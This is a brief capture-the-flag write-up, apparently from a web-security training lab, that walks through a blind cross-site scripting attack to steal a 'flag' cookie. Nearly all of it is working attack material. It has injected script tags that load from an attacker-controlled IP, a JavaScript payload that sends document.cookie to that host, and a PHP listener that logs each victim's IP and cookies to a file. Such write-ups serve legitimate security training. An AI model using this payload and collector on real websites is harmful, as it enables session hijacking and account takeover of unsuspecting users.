**What is the value of the 'flag' cookie?
```
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80

Visit http://10.129.98.191/assessment/index.php/2021/06/11/welcome-to-security-blog/
"><script src=http://10.10.15.29:8080/comment.js></script>
"><script src=http://10.10.15.29:8080/name.js></script>
"><script src=http://10.10.15.29:8080/website.js></script>
```
- website field is vulnerable

```
cd /tmp/tmpserver
nano script.js
document.location='http://10.10.15.29:8080/index.php?c='+document.cookie;
nano index.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

Put in website field: "><script src=http://10.10.15.29:8080/script.js></script>
```
- listener captures flag!
